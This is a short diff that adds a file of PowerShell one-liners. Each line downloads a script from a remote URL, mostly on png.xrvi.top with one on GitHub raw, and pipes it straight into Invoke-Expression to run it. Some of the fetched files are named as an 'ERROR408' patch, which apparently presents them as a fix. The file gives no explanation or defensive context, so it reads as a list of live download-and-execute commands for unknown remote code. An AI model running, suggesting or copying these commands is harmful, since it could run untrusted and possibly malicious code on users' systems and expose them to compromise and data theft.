@@ -1,0 +1,8 @@
+irm "" | iex
+powershell -Command ""
+irm "https://raw.githubusercontent.com/JYWYYHY/666/refs/heads/main/ERROR408-patch.cmd" | iex
+irm "https://png.xrvi.top/file/1787059320981_ERROR_408.cmd" | iex
+irm "https://png.xrvi.top/file/1787106511412_1" | iex
+irm "https://png.xrvi.top/file/1787107174509_1.ps1" | iex
+powershell -Command "irm "https://png.xrvi.top/file/1787107174509_1.ps1" | iex"
+powershell -Command "irm "https://png.xrvi.top/file/1787107549298_408" | iex"
